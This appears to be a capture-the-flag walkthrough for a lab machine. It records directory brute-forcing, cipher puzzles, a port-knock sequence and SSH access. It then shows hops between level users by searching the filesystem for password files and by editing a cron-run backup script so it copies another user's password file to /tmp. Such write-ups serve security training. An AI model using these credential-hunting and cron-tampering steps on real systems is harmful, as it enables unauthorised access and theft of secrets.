# [Task 5] Stage 5
# flag61
```
vi /etc/hosts
```

```
http://roadtoroot.com/
access
Welcome to my second hidden server

Enjoy the stego? I Guess yes

Take this as my personal reward
flag61: 73a0u8asqeeki7ashcv2 
```

# gobuster 
```
root@kali:~# gobuster dir -u http://roadtoroot.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://roadtoroot.com
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html,txt,php
[+] Timeout:        10s
===============================================================
2020/06/05 06:33:56 Starting gobuster
===============================================================
/index.html (Status: 200)
/robots.txt (Status: 200)
/execute (Status: 301)
/PI (Status: 301)
/TW (Status: 301)
/grasshopper (Status: 301)
/server-status (Status: 403)
/TB (Status: 301)
===============================================================
2020/06/05 06:50:02 Finished
===============================================================
root@kali:~# 

```

# flag62
``
http://roadtoroot.com/execute/
<p>Bruteforce...bruteforce.....bruteforce......never end</p>
<p>tired of bruteforce? How about we play something new</p>
flag 62: mylug980r9axzn6fvrl0
<a href=hello></a> 
```

# flag63
```
oot@kali:~# wget http://roadtoroot.com/execute/hello
--2020-06-05 06:37:07--  http://roadtoroot.com/execute/hello
Resolving roadtoroot.com (roadtoroot.com)... 10.10.197.22
Connecting to roadtoroot.com (roadtoroot.com)|10.10.197.22|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16664 (16K)
Saving to: ‘hello’

hello               100%[===================>]  16.27K  --.-KB/s    in 0s      

2020-06-05 06:37:07 (143 MB/s) - ‘hello’ saved [16664/16664]

root@kali:~# ls
Desktop    Downloads  hiddeneye      Music     Public	  thinclient_drives
Documents  hello      hydra.restore  Pictures  Templates  Videos
root@kali:~# chmod +x hello 
root@kali:~# ./hello 
I'm noob in C
Take this flag63: mubxspokswhcqr8aj6e5root@kali:~# 

```

# flag64
```
view-source:http://roadtoroot.com/robots.txt
Disallow:*

/TB
/PI
/TW

flag 64: ekvtyrcwshbl3hkwkzsh
```

# flag65
```html
http://roadtoroot.com/TW/
<p>This is a social networking site that relies on micro-blogging for communication<p>
<p>user: @65_6f</p>
<p>flag65: aqvdsfiaphmynifgjylz</p>
<!-- The flag is encrypted, the cipher name starts with B and the key is flag -->

Decrypt it with Beaufort cipher.
https://www.dcode.fr/beaufort-cipher
fvfdngsgqeoisdvawnph
```

# flag66
```html
view-source:http://roadtoroot.com/PI/
<p>Pins are visual bookmarks that you collect on boards</p>
<p>user: gsnwpwp_</p>
<p>flag 66: gfpi7hadqleilk4ycb58</p>

<!-- the username is encrypted, the cipher name starts with a -->

tukr77szwjovro4p4b58
```

# flag67
```
https://www.pinterest.jp/pin/664773594982327006/


https://www.pinterest.jp/pin/664773594982327023/
just an ordinary number 28817
```

# flag68
```
https://twitter.com/65_6f

https://twitter.com/65_6f/status/1180115743297245184


https://twitter.com/65_6f/status/1180119151362199552
44414
```

# flag69
```
Solve this, I dare you
AVGFCTSWPDUNRKQELMBQEGUWZK

https://www.dcode.fr/four-squares-cipher

FLAGISRNOZSEUGUVMAFRGKRPZK
```

# flag70
```html
view-source:http://roadtoroot.com/TB/

<p>This is a micro blogging site. In addition, you can have your own domain.</p>
<p>user: vnvnuxammt</p>
<p>flag 70:rqi51dlh6b67q0v7qhmc</p> 

<!-- The username is encrypted, the cipher name starts with C -->
The cipher is Ceaser.
iaiahknzzg
```

# flag71
```
https://memelorddk.tumblr.com/
https://twitter.com/65_6f/status/1180126418841112577

22B16ABDFBF26BB880807FEF53CEF1017936EE5309A85B2AD1E9D99B2E6F8BCE96BFA11061AA4D26E79B7A9DA72AD58F
mode: CBC
size: 128
VI: youcomingthisfar
SK: thisisroadstossh
Type: hex16
https://www.devglan.com/online-tools/aes-encryption-decryption
S25vY2sgaXQgb3JkZXI6IFRCLCBQSSwgVFcuClRoaXMgcG9ydCBpczogMzk5MTQ=
decode base64

Knock it order: TB, PI, TW.
This port is: 39914
```
# for next
```
view-source:http://roadtoroot.com/grasshopper/

<p>Are you ready to root the machine?</p>
<p> SSH username:</p><br>
<img src="user.png"/><br><br>
<p> SSH password</p><br>
<img src="pass.png"/><br><br>
<p>Where is the SSH port?</p>

https://crypto.interactive-maths.com/pigpen-cipher.html
beginner
timehascome

```

# [Task 6] Stage 6

# flag72
```
root@kali:~# telnet 10.10.104.255 9999
Trying 10.10.104.255...
Connected to 10.10.104.255.
Escape character is '^]'.
***************************
*   Port knocking input   *
***************************
Hi user, please enter the port sequence
The format is (can be more than 4): PORT PORT PORT PORT
> 39914 28817 44414
Something happen
Good luck!
Connection closed by foreign host.
root@kali:~# nmap -Pn -T5 10.10.104.255
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-05 09:50 UTC
Nmap scan report for ip-10-10-104-255.eu-west-1.compute.internal (10.10.104.255)
Host is up (0.00025s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
9999/tcp open  abyss
MAC Address: 02:80:68:24:7D:D6 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 2.90 seconds
root@kali:~# ssh beginner@10.10.104.255
The authenticity of host '10.10.104.255 (10.10.104.255)' can't be established.
ECDSA key fingerprint is SHA256:upGWH0517FwOM5FH5JZ5sUsX4MHQO+/2+Fs/KydtGj8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.104.255' (ECDSA) to the list of known hosts.
beginner@10.10.104.255's password:
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 1.0


39 packages can be updated.
0 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

$ ls -al
total 36
drwx------  4 beginner beginner 4096 Jun  5 09:50 .
drwxr-xr-x 10 root     root     4096 Oct  8  2019 ..
-rw-r--r--  1 beginner beginner  220 Apr  4  2018 .bash_logout
-rw-r--r--  1 beginner beginner 3771 Apr  4  2018 .bashrc
drwx------  2 beginner beginner 4096 Jun  5 09:50 .cache
-rw-r--r--  1 beginner beginner   29 Oct  8  2019 flag72
drwx------  3 beginner beginner 4096 Jun  5 09:50 .gnupg
----------  1 beginner beginner   31 Oct  8  2019 level1
-rw-r--r--  1 beginner beginner  807 Apr  4  2018 .profile
$ cat flag72
flag72: pdk0yp5w4ao6g7gq21r2
$
```

# flag73
```
$ chmod 777 level1
$ ls -al
total 36
drwx------  4 beginner beginner 4096 Jun  5 09:50 .
drwxr-xr-x 10 root     root     4096 Oct  8  2019 ..
-rw-r--r--  1 beginner beginner  220 Apr  4  2018 .bash_logout
-rw-r--r--  1 beginner beginner 3771 Apr  4  2018 .bashrc
drwx------  2 beginner beginner 4096 Jun  5 09:50 .cache
-rw-r--r--  1 beginner beginner   29 Oct  8  2019 flag72
drwx------  3 beginner beginner 4096 Jun  5 09:50 .gnupg
-rwxrwxrwx  1 beginner beginner   31 Oct  8  2019 level1
-rw-r--r--  1 beginner beginner  807 Apr  4  2018 .profile
$ cat level1
password: i30c8incjneju36lzuxm
$ ls -al ../
total 40
drwxr-xr-x 10 root     root     4096 Oct  8  2019 .
drwxr-xr-x 24 root     root     4096 Oct  8  2019 ..
drwx------  4 beginner beginner 4096 Jun  5 09:50 beginner
drwx------  3 level1   level1   4096 Oct  8  2019 level1
drwx------  2 level2   level2   4096 Oct  8  2019 level2
drwx------  2 level3   level3   4096 Oct  8  2019 level3
drwx------  2 level4   level4   4096 Oct  8  2019 level4
drwx------  5 level5   level5   4096 Oct  8  2019 level5
drwx------  2 level6   level6   4096 Oct  8  2019 level6
drwx------  4 main     main     4096 Oct  8  2019 main
$ su level1
Password:
$ ls
ls: cannot open directory '.': Permission denied
$ cd ../
$ ls
beginner  level1  level2  level3  level4  level5  level6  main
$ cd level1
$ ls -al
total 28
drwx------  3 level1 level1 4096 Oct  8  2019 .
drwxr-xr-x 10 root   root   4096 Oct  8  2019 ..
drwxr-xr-x  2 root   root   4096 Oct  8  2019 ...
-rw-r--r--  1 level1 level1  220 Apr  4  2018 .bash_logout
-rw-r--r--  1 level1 level1 3771 Apr  4  2018 .bashrc
-rw-r--r--  1 level1 level1   30 Oct  8  2019 flag73
-rw-r--r--  1 level1 level1  807 Apr  4  2018 .profile
$ cat flag73
flag 73: r6jk3oiu5tjmnuokzrcq
$
```

# flag74
```
$ ls -al ...
total 12
drwxr-xr-x 2 root   root   4096 Oct  8  2019 .
drwx------ 3 level1 level1 4096 Oct  8  2019 ..
-rw-r--r-- 1 level1 level1   31 Oct  8  2019 .level2
$ cat .../.level2
password: gkgl4ilh6469ux3j82yy
$ su level2
Password:
$ whoami
level2
$ cd ../level2
$ ls -al
total 28
drwx------  2 level2 level2 4096 Oct  8  2019 .
drwxr-xr-x 10 root   root   4096 Oct  8  2019 ..
-rw-r--r--  1 level2 level2  220 Apr  4  2018 .bash_logout
-rw-r--r--  1 level2 level2 3771 Apr  4  2018 .bashrc
-rw-r--r--  1 level2 level2   30 Oct  8  2019 flag74
-rw-r--r--  1 level2 level2   15 Oct  8  2019 nothing
-rw-r--r--  1 level2 level2  807 Apr  4  2018 .profile
$ cat flag74
flag 74: 7z8w6bvsyipjz3o9s3a5
```


```
$ find / -iname "*level*3*" 2>>/dev/null
/lib/systemd/system/runlevel3.target.wants
/lib/systemd/system/runlevel3.target
/usr/lib/python3/dist-packages/urllib3/contrib/_securetransport/__pycache__/low_level.cpython-36.pyc
/usr/lib/python3/dist-packages/twisted/logger/test/__pycache__/test_levels.cpython-36.pyc
/usr/lib/python3/dist-packages/twisted/logger/__pycache__/_levels.cpython-36.pyc
/usr/lib/python3/dist-packages/dbus/__pycache__/lowlevel.cpython-36.pyc
/usr/share/X11/xkb/symbols/level3
/snap/core/7270/lib/systemd/system/runlevel3.target
/snap/core/7270/lib/systemd/system/runlevel3.target.wants
/snap/core/7270/usr/share/X11/xkb/symbols/level3
/home/level3
```

```
$ ls -al
total 2097256
    drwxr-xr-x  24 root root       4096 Oct  8  2019 .
    drwxr-xr-x  24 root root       4096 Oct  8  2019 ..
drwxr-xr-x   2 root root       4096 Oct  8  2019 bin
drwxr-xr-x   3 root root       4096 Oct  8  2019 boot
drwxr-xr-x   2 root root       4096 Oct  8  2019 cdrom
drwxr-xr-x  17 root root       3700 Jun  5 09:46 dev
    drwxr-xr-x  94 root root       4096 Oct 19  2019 etc
    drwxr-xr-x  10 root root       4096 Oct  8  2019 home
lrwxrwxrwx   1 root root         33 Oct  8  2019 initrd.img -> boot/initrd.img-4.15.0-65-generic
lrwxrwxrwx   1 root root         33 Oct  8  2019 initrd.img.old -> boot/initrd.img-4.15.0-65-generic
drwxr-xr-x  22 root root       4096 Oct  8  2019 lib
drwxr-xr-x   2 root root       4096 Aug  5  2019 lib64
    drwx------   2 root root      16384 Oct  8  2019 lost+found
    drwxr-xr-x   2 root root       4096 Aug  5  2019 media
    drwxr-xr-x   2 root root       4096 Aug  5  2019 mnt
    drwxr-xr-x   2 root root       4096 Aug  5  2019 opt
dr-xr-xr-x 124 root root          0 Jun  5 09:46 proc
    drwx------   5 root root       4096 Oct  8  2019 root
    drwxr-xr-x  25 root root        900 Jun  5 12:10 run
    drwxr-xr-x   2 root root      12288 Oct  8  2019 sbin
drwxr-xr-x   4 root root       4096 Oct  8  2019 snap toomcanty
    drwxr-xr-x   2 root root       4096 Aug  5  2019 srv nothing
    -rw-------   1 root root 2147483648 Oct  8  2019 swap.img
dr-xr-xr-x  13 root root          0 Jun  5 10:10 sys
    drwxrwxrwt  10 root root       4096 Jun  5 10:57 tmp
    drwxr-xr-x  10 root root       4096 Aug  5  2019 usr
    drwxr-xr-x  14 root root       4096 Oct  8  2019 var 
lrwxrwxrwx   1 root root         30 Oct  8  2019 vmlinuz -> boot/vmlinuz-4.15.0-65-generic
lrwxrwxrwx   1 root root         30 Oct  8  2019 vmlinuz.old -> boot/vmlinuz-4.15.0-65-generic
```

```
$ grep -R "passowrd: " /var 2>>/dev/null
$  grep -R "passowrd: " /dev 2>>/dev/null
$   
```

# flag 76
```
$ find / -user level3 2>>/dev/null
/var/lib/vim/addons/pass
/home/level3
$ ls -al /var/lib/vim/addons/pass
-rw-r--r-- 1 level3 level3 35 Oct  8  2019 /var/lib/vim/addons/pass
$ cat /var/lib/vim/addons/pass
level 4 pass: d5kzrgizk0eh4k4u31ng
$ su level4
Password:
$ cd /homelevel4
sh: 1: cd: can't cd to /homelevel4
$ cd /home/level4
$ ls -al
total 28
drwx------  2 level4 level4 4096 Oct  8  2019 .
drwxr-xr-x 10 root   root   4096 Oct  8  2019 ..
-rw-r--r--  1 level4 level4  220 Apr  4  2018 .bash_logout
-rw-r--r--  1 level4 level4 3771 Apr  4  2018 .bashrc
-rw-r--r--  1 level4 level4   30 Oct  8  2019 flag76
-rw-r--r--  1 root   root    103 Oct  8  2019 .hidden_note
-rw-r--r--  1 level4 level4  807 Apr  4  2018 .profile
$ cat flag76
flag 76: bhjnkoyf0vmwh3a8mo92
$
```

# flag77

```
$ ls -al
total 48
drwx------  5 level4 level4 4096 Jun  5 13:09 .
drwxr-xr-x 10 root   root   4096 Oct  8  2019 ..
-rw-r--r--  1 level4 level4  220 Apr  4  2018 .bash_logout
-rw-r--r--  1 level4 level4 3771 Apr  4  2018 .bashrc
drwx------  2 level4 level4 4096 Jun  5 12:44 .cache
-rw-r--r--  1 level4 level4   30 Oct  8  2019 flag76
drwx------  3 level4 level4 4096 Jun  5 12:45 .gnupg
-rw-r--r--  1 root   root    103 Oct  8  2019 .hidden_note
drwxrwxr-x  3 level4 level4 4096 Jun  5 12:41 .local
-rw-r--r--  1 level4 level4  807 Apr  4  2018 .profile
-rw-rw-r--  1 level4 level4   66 Jun  5 12:41 .selected_editor
-rw-------  1 level4 level4 2136 Jun  5 13:09 .viminfo
$ cat .hidden_note
Hi level 4,

Task scheduling was fun. I don't know who put pass5.txt into my directory.

From,
level5

$
$ find / -user level5 2>>/dev/null
/bin/what
/var/backup
/var/backup/test.txt
/var/backup/backup.sh
/home/level5
$ cat /var/backup/backup.sh
#!/bin/bash
cp /home/level5/test.txt /var/backup/test.txt

$ vi /var/backup/backup.sh
$ cat /var/backup/backup.sh
#!/bin/bash
cp /home/level5/test.txt /var/backup/test.txt
cp /home/level5/pass5.txt /tmp/pass5.txt
$ ls /tmp
crontab.UoEAKj  lstest.txt  systemd-private-53d6ed1a3f114ef0a95d7b5b440f29ea-systemd-resolved.service-X34X5c   test2.txt  tmux-1005
linpeas.sh      pass5.txt   systemd-private-53d6ed1a3f114ef0a95d7b5b440f29ea-systemd-timesyncd.service-ZP5KbG  tmux-1003
$ cat /tmp/pass5.txt
level 5 pass: g669dwbb3dcadt1eui63
$ su level5
Password:
$ whoami
level5
$ cd /home/level5
$ ls -al
total 48
drwx------  5 level5 level5 4096 Oct  8  2019 .
drwxr-xr-x 10 root   root   4096 Oct  8  2019 ..
-rw-r--r--  1 level5 level5  220 Apr  4  2018 .bash_logout
-rw-r--r--  1 level5 level5 3771 Apr  4  2018 .bashrc
drwx------  2 level5 level5 4096 Oct  8  2019 .cache
-rw-rw-r--  1 level5 level5   30 Oct  8  2019 flag77
drwx------  3 level5 level5 4096 Oct  8  2019 .gnupg
drwxrwxr-x  3 level5 level5 4096 Oct  8  2019 .local
-rw-rw-r--  1 level5 level5   35 Oct  8  2019 pass5.txt
-rw-r--r--  1 level5 level5  807 Apr  4  2018 .profile
-rw-rw-r--  1 level5 level5   66 Oct  8  2019 .selected_editor
-rw-rw-r--  1 level5 level5   20 Oct  8  2019 test.txt
$ cat flag77
flag 77: tyqrkkk93w851fzg0yyn
$
```

```
$ find / -name "*game*" 2>>/dev/null
/lib/modules/4.15.0-65-generic/kernel/drivers/input/joystick/gamecon.ko
/lib/modules/4.15.0-65-generic/kernel/drivers/input/gameport
/lib/modules/4.15.0-65-generic/kernel/drivers/input/gameport/gameport.ko
/usr/local/games
/usr/share/mime/application/x-gameboy-color-rom.xml
/usr/share/mime/application/x-gamegear-rom.xml
/usr/share/mime/application/x-gamecube-rom.xml
/usr/share/mime/application/x-gameboy-rom.xml
/usr/games
/usr/src/linux-headers-4.15.0-65-generic/include/config/joystick/gamecon.h
/usr/src/linux-headers-4.15.0-65-generic/include/config/gameport
/usr/src/linux-headers-4.15.0-65-generic/include/config/gameport.h
/usr/src/linux-headers-4.15.0-65/drivers/input/gameport
/usr/src/linux-headers-4.15.0-65/include/uapi/linux/gameport.h
/usr/src/linux-headers-4.15.0-65/include/linux/gameport.h
/snap/core/7270/usr/games
/snap/core/7270/usr/local/games
$ cd /usr/games
$ ls -al
total 12
drwxr-xr-x  2 root root 4096 Oct  8  2019 .
drwxr-xr-x 10 root root 4096 Aug  5  2019 ..
-rw-r--r--  1 root root   24 Oct  8  2019 .TheLegendofZelda
$ cat .TheLegendofZelda
vim pass

save_me_link


$ cat .viminfo
# This viminfo file was generated by Vim 8.0.
# You may edit it if you're careful!

# Viminfo version
|1,4

# Value of 'encoding' when this file was written
*encoding=utf-8


# hlsearch on (H) or off (h):
~h
# Command Line History (newest to oldest):
:q!
|2,0,1591364650,,"q!"

# Search String History (newest to oldest):

# Expression History (newest to oldest):

# Input Line History (newest to oldest):

# Debug Line History (newest to oldest):

# Registers:

# File marks:
'0  1  0  /usr/games/pass
|4,48,1,0,1591364650,"/usr/games/pass"

# Jumplist (newest first):
-'  1  0  /usr/games/pass
|4,39,1,0,1591364650,"/usr/games/pass"

# History of marks within files (newest to oldest):

> /usr/games/pass
        *       1591364647      0
        "       1       0
```
